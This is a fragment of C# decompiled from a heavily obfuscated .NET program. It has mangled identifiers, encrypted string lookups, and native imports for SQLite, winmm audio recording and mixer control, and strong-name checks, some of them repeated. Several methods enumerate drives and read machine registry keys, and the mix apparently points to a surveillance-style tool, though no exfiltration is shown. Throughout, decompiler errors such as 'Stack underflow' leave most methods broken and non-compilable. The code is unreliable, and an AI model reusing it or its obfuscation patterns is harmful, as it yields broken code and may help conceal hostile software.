			if (((_0019._0005)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_0014_0002;
				AutoResetEvent autoResetEvent = ((_0019._0005)/*Error near IL_0015: Stack underflow*/)._0001;
				if (2u != 0)
				{
					/*Error near IL_007e: Stack underflow*/(autoResetEvent);
				}
				P_0._0001 = null;
			}
			object obj = P_0._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				if (_0090_0002._0099_0005(P_0._0001, IntPtr.Zero))
				{
					_0018._0001(P_0._0001);
					P_0._0001 = IntPtr.Zero;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static char _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _009F_0004._007E_0089_000E(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			throw new InvalidCastException();
		}

		static void _0001(global::_0004._001A P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0004._001A)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0004._001A).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		static int _0001(global::_0017._007F._0007 _0002, int P_1)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Expected I4, but got Unknown
			int num = 0;
			while (P_1 >= 4)
			{
				_003F val = /*Error near IL_0009: Stack underflow*/+ 2;
				if (3u != 0)
				{
					num = (int)val;
				}
				P_1 >>= 1;
			}
			return num + P_1;
		}

		[DllImport("winmm.dll", EntryPoint = "waveInStop")]
		static extern MmResult _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_int")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, int _0004);

		static void _0001(global::_0017._0007 _0002, byte[] _0003, int _0004, int P_3)
		{
			//IL_0023: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			_ = _0012_0003._008E_0006;
			/*Error near IL_002a: Stack underflow*/((int)/*Error near IL_002a: Stack underflow*/);
			byte[] array = (byte[])/*Error near IL_002d: Stack underflow*/;
			for (int i = 0; i < 4; i++)
			{
				_0003[_0004 + 3 - i] = array[i];
			}
		}

		static int _0001(global::_0017._007F._0002 _0002, int P_1)
		{
			//IL_009e: Incompatible stack heights: 0 vs 1
			//IL_00a4: Incompatible stack heights: 0 vs 2
			//IL_00aa: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._007F._0002)/*Error near IL_000a: Stack underflow*/)._0003;
			if (/*Error near IL_0011: Stack underflow*/ < /*Error near IL_0011: Stack underflow*/)
			{
				if (((global::_0017._007F._0002)/*Error near IL_001b: Stack underflow*/)._0001 == _0002._0002)
				{
					return -1;
				}
				_0002._0001 |= (uint)(((_0002._0001[_0002._0001++] & 0xFF) | ((_0002._0001[_0002._0001++] & 0xFF) << 8)) << _0002._0003);
				_0002._0003 += 16;
			}
			return (int)(_0002._0001 & ((1 << P_1) - 1));
		}

		unsafe static bool _0001(global::_0017._0005 _0002, _001B._0004 _0003, _001E._0004 _0004, int P_3)
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			//IL_0035: Incompatible stack heights: 0 vs 2
			_ = ((_001E._0004)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ref _0003;
			int num = ((global::_0013._0005)/*Error near IL_0012: Stack underflow*/)._0002((int)/*Error near IL_0012: Stack underflow*/, ref *(_001B._0004*)/*Error near IL_0012: Stack underflow*/, (global::_0017._0005)/*Error near IL_0012: Stack underflow*/);
			return num switch
			{
				-2147220987 => false, 
				0 => true, 
				_ => throw _001C_0005._0006_000F(num), 
			};
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_db_readonly")]
		static extern int _0001(IntPtr _0002, IntPtr _0003);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_error")]
		static extern void _0001(IntPtr _0002, byte[] _0003, int _0004);

		static void _0001(ref StateChangeEventArgs _0002, global::_0017._0080 _0003, ConnectionState P_2)
		{
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			ConnectionState connectionState = ((global::_0017._0080)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0017._0080)/*Error near IL_0011: Stack underflow*/)._0001 = P_2;
			if (_0003._0001 != null && P_2 != connectionState)
			{
				StateChangeEventArgs stateChangeEventArgs = new StateChangeEventArgs(connectionState, P_2);
				_001D_0005._007E_0007_000F(_0003._0001, _0003, stateChangeEventArgs);
				_0002 = stateChangeEventArgs;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_result_int")]
		static extern void _0001(IntPtr _0002, int _0003);

		static string _0001()
		{
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107358313);
			_0018._0001((string)/*Error near IL_004f: Stack underflow*/, (string)null);
			string text = (string)/*Error near IL_0052: Stack underflow*/;
			if (text != null)
			{
				return text;
			}
			if (_0018._0001(_0080._0014._0001(107358276), (string)null) != null)
			{
				text = _0018._0001();
				if (text != null)
				{
					return text;
				}
			}
			return global::_0002._007E_0019(_0097_0004._001F_000E());
		}

		static void _0001(_001D._0004 P_0)
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			if (((_001D._0004)/*Error near IL_0009: Stack underflow*/)._0001 == _001C._0005._0003)
			{
				object obj = ((_001D._0004)/*Error near IL_0013: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = _0018._0001(P_0._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, _0080._0014._0001(107358259));
				}
				P_0._0001 = _001C._0005._0002;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0017._0086 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0017._0086)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0017._0086).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_text")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, byte[] _0004, int _0005, IntPtr _0006);

		unsafe static void _0001(int _0002, byte[] _0003, int _0004, byte[] _0005)
		{
			//IL_004a: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			fixed (byte* ptr = &((byte[])/*Error near IL_0005: Stack underflow*/)[/*Error near IL_0005: Stack underflow*/])
			{
				fixed (byte* ptr3 = &_0003[0])
				{
					float* ptr2 = (float*)ptr;
					float* ptr4 = (float*)ptr3;
					int num = _0004 / 4;
					for (int i = 0; i < num; i++)
					{
						ptr2[i] += ptr4[i];
					}
				}
			}
		}

		static void _0001(int _0002, global::_0016._0012 _0003, int P_2)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Invalid comparison between Unknown and I4
			//IL_005f: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 2
			int num = ((global::_0016._0012)/*Error near IL_0009: Stack underflow*/)._0001;
			_ = /*Error near IL_000a: Stack underflow*/+ num;
			int num2 = ((global::_0016._0012)/*Error near IL_0011: Stack underflow*/)._0001._0002;
			if ((int)/*Error near IL_0018: Stack underflow*/ <= num2)
			{
				_0003._0004 = P_2;
				if (_0002 + _0003._0002 <= _0003._0001._0001)
				{
					_0003._0005 = _0002;
					return;
				}
				throw new ArgumentException(_0080._0014._0001(107358238));
			}
			throw new ArgumentException(_0080._0014._0001(107358238));
		}

		static object _0001(object[] _0002, global::_0012._0013 _0003, string _0004, string _0005)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			return _0018._0001((global::_0012._0013)/*Error near IL_000d: Stack underflow*/, (string)/*Error near IL_000d: Stack underflow*/, (object[])/*Error near IL_000d: Stack underflow*/, _0004, CommandBehavior.Default);
		}

		static void _0001(int _0002, global::_0004._0008 _0003, int _0004, float[] P_3)
		{
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			for (int i = 0; i < _0002; i++)
			{
				float num = ((float[])/*Error near IL_000d: Stack underflow*/)[_0004 + i];
				_0018._0001((global::_0004._0008)/*Error near IL_0012: Stack underflow*/, num);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static long _0001(global::_0007._0006 _0002, long P_1)
		{
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Expected I8, but got Unknown
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			int num = ((global::_0007._0006)/*Error near IL_0009: Stack underflow*/)._0002;
			_ = /*Error near IL_000b: Stack underflow*// num;
			int num2 = ((global::_0007._0006)/*Error near IL_0012: Stack underflow*/)._0001;
			return /*Error near IL_0014: Stack underflow*/* num2;
		}

		static void _0001(_0080._0017 _0002, string _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = (object)(_0080._0017)/*Error near IL_0007: Stack underflow*/;
			_0018._0001((object)/*Error near IL_0017: Stack underflow*/, (string)/*Error near IL_0017: Stack underflow*/);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_clear_bindings")]
		static extern _0080._0017 _0001(IntPtr _0002);

		static DateTime _0001(long _0002, DateTimeKind _0003)
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			new DateTime((long)/*Error near IL_0012: Stack underflow*/, (DateTimeKind)/*Error near IL_0012: Stack underflow*/);
			return (DateTime)/*Error near IL_0007: Stack underflow*/;
		}

		static void _0001(global::_0016._0012 P_0)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0016._0012)/*Error near IL_0007: Stack underflow*/)._0001);
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_column_origin_name16_interop")]
		static extern IntPtr _0001(IntPtr _0002, int _0003, ref int _0004);

		static _001D._0016 _0001(float _0002, float _0003, float _0004, float _0005)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_016b: Incompatible stack heights: 0 vs 3
			//IL_0171: Incompatible stack heights: 0 vs 2
			//IL_017b: Expected F8, but got Unknown
			//IL_017b: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0014: Stack underflow*/;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_001b: Stack underflow*/;
			Math.Cos(/*Error near IL_001c: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_0023: Stack underflow*/;
			double num4 = /*Error near IL_0028: Stack underflow*/((double)/*Error near IL_0028: Stack underflow*/);
			double num5 = global::_0014._0095_0002(10.0, _0004 / 40f);
			double num6 = num4 / 2.0 * global::_0015._009F_0002((num5 + 1.0 / num5) * (double)(1f / _0003 - 1f) + 2.0);
			double num7 = 2.0 * global::_0015._009F_0002(num5) * num6;
			double num8 = num5 * (num5 + 1.0 + (num5 - 1.0) * num3 + num7);
			double num9 = -2.0 * num5 * (num5 - 1.0 + (num5 + 1.0) * num3);
			double num10 = num5 * (num5 + 1.0 + (num5 - 1.0) * num3 - num7);
			double num11 = num5 + 1.0 - (num5 - 1.0) * num3 + num7;
			double num12 = 2.0 * (num5 - 1.0 - (num5 + 1.0) * num3);
			double num13 = num5 + 1.0 - (num5 - 1.0) * num3 - num7;
			return new _001D._0016(num11, num12, num13, num8, num9, num10);
		}

		static void _0001(int _0002, bool _0003, global::_000E._0019 _0004, int _0005 = 64, bool _0006 = 32, int P_5)
		{
			//IL_0012: Invalid comparison between Unknown and I4
			//IL_00b9: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 1
			//IL_00c5: Incompatible stack heights: 0 vs 1
			int num = (((int)/*Error near IL_000c: Stack underflow*/ != 0 && (int)/*Error near IL_0014: Stack underflow*/ >= 4) ? ((_0005 > 8192) ? 8192 : _0005) : 0);
			((global::_000E._0019)/*Error near IL_002c: Stack underflow*/)._0008 = num;
			_0004._000F = ((_0004._0008 == 0) ? 1 : ((P_5 <= 1) ? 1 : ((P_5 >= 4096) ? 4096 : P_5)));
			_0004._000E = ((_0004._0008 == 0) ? ((_0002 > 0) ? ((_0002 >= 4) ? 4 : _0002) : 0) : 0);
			_0004._0001 = _0006 && _0004._0008 == 0;
			if (_0004._0008 == 0)
			{
				_0004._0002 = new float[0];
				_0004._0003 = 0;
			}
			if (_0004._000E == 0)
			{
				_0004._0001 = null;
			}
		}

		static void _0001(string _0002, global::_0017._0080 _0003, string P_2)
		{
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0058: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 == null)
			{
				throw new InvalidOperationException(_0080._0014._0001(107358717));
			}
			if ((_0003._0003 & SQLiteConnectionFlags.NoLoadExtension) == SQLiteConnectionFlags.NoLoadExtension)
			{
				throw new SQLiteException(_0080._0014._0001(107358644));
			}
			_0003._0001._0001(P_2, _0002);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(global::_0016._0001 P_0)
		{
			//IL_0084: Incompatible stack heights: 0 vs 1
			//IL_0094: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107396634);
			string text = (string)/*Error near IL_008a: Stack underflow*/;
			_001E_0005._0008_000F();
			DriveInfo[] array = (DriveInfo[])/*Error near IL_0018: Stack underflow*/;
			DriveInfo[] array2 = array;
			DriveInfo[] array3 = array2;
			foreach (DriveInfo driveInfo in array3)
			{
				if (global::_001B._007E_0090_0003(driveInfo))
				{
					text = global::_0011._008E_0002(text, global::_0002._007E_001A(driveInfo), global::_0002._007E_0006(_0080._0014._0001(107396940)));
				}
			}
			return text;
		}

		static long _0001(int _0002, IntPtr _0003)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = _001F_0005._000E_000F;
			/*Error near IL_0017: Stack underflow*/((IntPtr)/*Error near IL_0017: Stack underflow*/, (int)/*Error near IL_0017: Stack underflow*/);
			return (long)/*Error near IL_000c: Stack underflow*/;
		}

		static string _0001(global::_0016._0001 _0002, string P_1)
		{
			//IL_008f: Incompatible stack heights: 0 vs 2
			//IL_00a6: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107396634);
			string text = (string)/*Error near IL_00ac: Stack underflow*/;
			try
			{
				_ = global::_001C._0095_0003;
				if (/*Error near IL_001d: Stack underflow*/((string)/*Error near IL_001d: Stack underflow*/))
				{
					string[] array = _0095._0084_0004(P_1);
					string[] array2 = array;
					foreach (string text2 in array2)
					{
						if (_0018._0001(text2, _0002))
						{
							text = global::_0011._008E_0002(text, text2, global::_000E._008A_0002(_0080._0014._0001(107396652), new char[1] { '|' })[0]);
						}
					}
				}
			}
			catch
			{
			}
			return text;
		}

		static void _0001(Guid _0002, Guid _0003, _001B._0014 P_2)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001f: Incompatible stack heights: 0 vs 2
			//IL_0022: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001B._0014)/*Error near IL_000c: Stack underflow*/)._0001;
			int num = ((global::_0018._0017)/*Error near IL_0015: Stack underflow*/)._0001((Guid)/*Error near IL_0015: Stack underflow*/, (Guid)/*Error near IL_0015: Stack underflow*/);
			/*Error near IL_001a: Stack underflow*/(num);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_backup_init")]
		static extern IntPtr _0001(IntPtr _0002, byte[] _0003, IntPtr _0004, byte[] _0005);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_realloc")]
		static extern IntPtr _0001(IntPtr _0002, int _0003);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_rollback_hook")]
		static extern IntPtr _0001(IntPtr _0002, global::_0010._001E _0003, IntPtr _0004);

		static bool _0001(int _0002, global::_0005._0005 _0003, _001E._0004 P_2)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			_0018._0001((_001E._0004)/*Error near IL_0024: Stack underflow*/, (global::_0005._0005)/*Error near IL_0024: Stack underflow*/);
			_001B._0004 obj = (_001B._0004)/*Error near IL_0007: Stack underflow*/;
			bool result = _0018._0001(global::_0017._0005._0002, obj, P_2, _0002);
			_0018._0001(ref obj);
			return result;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_bind_blob")]
		static extern _0080._0017 _0001(IntPtr _0002, int _0003, byte[] _0004, int _0005, IntPtr _0006);

		static void _0001(Type _0002)
		{
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0077: Incompatible stack heights: 0 vs 1
			_ = _001D_0004._007E_008A_0008;
			_0091._0080_0004(typeof(_0019._007F).TypeHandle);
			/*Error near IL_0077: Stack underflow*/((object)/*Error near IL_0077: Stack underflow*/, (Type)/*Error near IL_0077: Stack underflow*/, false);
			object[] array = (object[])/*Error near IL_0017: Stack underflow*/;
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] is _0019._007F obj)
				{
					string text = obj._0001;
					int num = obj._0001;
					global::_0016._001C obj2 = obj._0001;
					Delegate @delegate = obj._0001;
					Delegate delegate2 = obj._0002;
					_0018._0001(delegate2, text, _0002, @delegate, obj2, num);
				}
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0016._0012 _0002, double P_1)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			global::_0017._0015 obj = ((global::_0016._0012)/*Error near IL_0009: Stack underflow*/)._0001;
			_0018._0001((double)/*Error near IL_001d: Stack underflow*/, obj);
			_0018._0001(_0002);
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerSetControlDetails")]
		static extern MmResult _0001(IntPtr _0002, ref global::_0015._0003._0001 _0003, _001D._0001 _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_commit_hook")]
		static extern IntPtr _0001(IntPtr _0002, global::_0017._0081 _0003, IntPtr _0004);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_create_collation")]
		static extern _0080._0017 _0001(IntPtr _0002, byte[] _0003, int _0004, IntPtr _0005, global::_0006._001A _0006);

		static System.Data.IsolationLevel _0001(global::_0017._0080 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((global::_0017._0080)/*Error near IL_0007: Stack underflow*/)._0004;
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_blob")]
		static extern IntPtr _0001(IntPtr _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static string _0001(int _0002, _001F._0019 P_1)
		{
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_0060: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005d: Stack underflow*/);
			if (((_001F._0019)/*Error near IL_000b: Stack underflow*/)._0001[_0002]._0001 != null)
			{
				return _009E_0003._007E_0003_0008(P_1._0001[_0002]._0001._0001, P_1._0001[_0002]._0004);
			}
			return _0080._0014._0001(107358440);
		}

		static global::_0017._0080 _0001(_0014 _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			try
			{
				if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
				{
					global::_0010._001C obj = ((_0014)/*Error near IL_000b: Stack underflow*/)._0001;
					if (obj != null)
					{
						global::_0017._0080 obj2 = obj.Connection;
						if (obj2 != null)
						{
							return obj2;
						}
					}
				}
			}
			catch (ObjectDisposedException)
			{
			}
			return null;
		}

		static void _0001(int _0002)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0009: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ < 1 || (int)/*Error near IL_000b: Stack underflow*/ > 16)
			{
				_0080._0014._0001(107358531);
				throw new ArgumentOutOfRangeException(actualValue: _0002, message: _0008_0002._0007_0005(_0080._0014._0001(107383405), _0002), paramName: (string?)/*Error near IL_0037: Stack underflow*/);
			}
		}

		static global::_0005._0003 _0001(global::_0012._0005 P_0)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0012._0005)/*Error near IL_000e: Stack underflow*/, true);
			return (global::_0005._0003)/*Error near IL_0006: Stack underflow*/;
		}

		static void _0001(global::_0004._0001 _0002, string P_1)
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _007F_0005._000F_000F;
				/*Error near IL_0017: Stack underflow*/((string)/*Error near IL_0017: Stack underflow*/);
			}
			catch
			{
			}
		}

		static string[] _0001()
		{
			//IL_003d: Incompatible stack heights: 0 vs 3
			//IL_0044: Incompatible stack heights: 0 vs 1
			_ = _0019_0005._007E_0003_000F;
			_ = Registry.LocalMachine;
			_0080._0014._0001(107358550);
			/*Error near IL_0044: Stack underflow*/((object)/*Error near IL_0044: Stack underflow*/, (string)/*Error near IL_0044: Stack underflow*/);
			RegistryKey registryKey = (RegistryKey)/*Error near IL_0047: Stack underflow*/;
			string[] result = new string[0];
			if (registryKey != null)
			{
				result = _0080_0005._007E_0010_000F(registryKey);
				global::_0008._007E_0015_0002(registryKey);
			}
			return result;
		}

		static byte[] _0001(int _0002)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			byte[] array = new byte[4];
			for (int num = ((Array)/*Error near IL_000b: Stack underflow*/).Length - 1; num >= 0; num--)
			{
				array[num] = (byte)(_0002 % 128);
				_0002 /= 128;
			}
			return array;
		}

		unsafe static string _0001(global::_0002._0019 _0002, ref bool P_1)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_ = ((global::_0002._0019)/*Error near IL_0007: Stack underflow*/)._0001.HasValue;
			if ((int)/*Error near IL_000b: Stack underflow*/ != 0)
			{
				bool value = _0002._0001.Value;
				*(bool*)(nint)/*Error near IL_0019: Stack underflow*/ = value;
			}
			else
			{
				P_1 = _0018._0001();
			}
			string text = _0002._0004;
			if (text != null)
			{
				return text;
			}
			return _0018._0001();
		}

		unsafe static global::_0008._000E _0001(int _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			//IL_0014: Incompatible stack heights: 0 vs 1
			global::_0008._000E obj = default(global::_0008._000E);
			_ = ref obj;
			_0018._0001(out *(global::_0008._000E*)/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/);
			return (global::_0008._000E)/*Error near IL_0009: Stack underflow*/;
		}

		static void _0001(global::_0017._007F._0008 P_0)
		{
			//IL_002a: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			//IL_0030: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0008)/*Error near IL_0009: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._0008)/*Error near IL_0010: Stack underflow*/)._0014;
			int num2 = ((byte[])/*Error near IL_0011: Stack underflow*/)[num] << 5;
			byte num3 = P_0._0001[P_0._0014 + 1];
			((global::_0017._007F._0008)/*Error near IL_0028: Stack underflow*/)._0010 = num2 ^ num3;
		}

		static IEnumerable<_001B._0004> _0001(_001E._0004 _0002, int P_1)
		{
			//IL_0019: Incompatible stack heights: 0 vs 3
			//IL_001c: Incompatible stack heights: 0 vs 2
			new _001E._0004._0001(-2);
			((_001E._0004._0001)/*Error near IL_000f: Stack underflow*/)._0001 = (_001E._0004)/*Error near IL_000f: Stack underflow*/;
			/*Error near IL_000f: Stack underflow*/;
			((_001E._0004._0001)/*Error near IL_0017: Stack underflow*/)._0005 = (int)/*Error near IL_0017: Stack underflow*/;
			return (IEnumerable<_001B._0004>)/*Error near IL_0018: Stack underflow*/;
		}

		static byte[] _0001(_001C._0007 _0002, global::_0004._000E P_1)
		{
			//IL_005c: Incompatible stack heights: 0 vs 2
			//IL_0063: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0091_0002;
			Stream stream = ((_001C._0007)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0063: Stack underflow*/(stream);
			long num = (long)/*Error near IL_0066: Stack underflow*/;
			_007F_0002._007E_0083_0005(_0002._0001, P_1.StreamPosition);
			byte[] array = new byte[P_1.Length];
			_0082._007E_0006_0004(_0002._0001, array, 0, array.Length);
			_007F_0002._007E_0083_0005(_0002._0001, num);
			return array;
		}

		static void _0001(global::_0017._0002[] _0002, _0019._0001 P_1)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			_ = ((_0019._0001)/*Error near IL_0039: Stack underflow*/).Generators;
			global::_0018._0005[] array = (global::_0018._0005[])/*Error near IL_003c: Stack underflow*/;
			foreach (global::_0018._0005 obj in array)
			{
				if (obj._0001 == GeneratorEnum.Instrument)
				{
					obj._0001 = _0002[obj._0001];
				}
			}
		}

		[DllImport("winmm.dll", EntryPoint = "waveOutUnprepareHeader")]
		static extern MmResult _0001(IntPtr _0002, _007F._0006 _0003, int _0004);

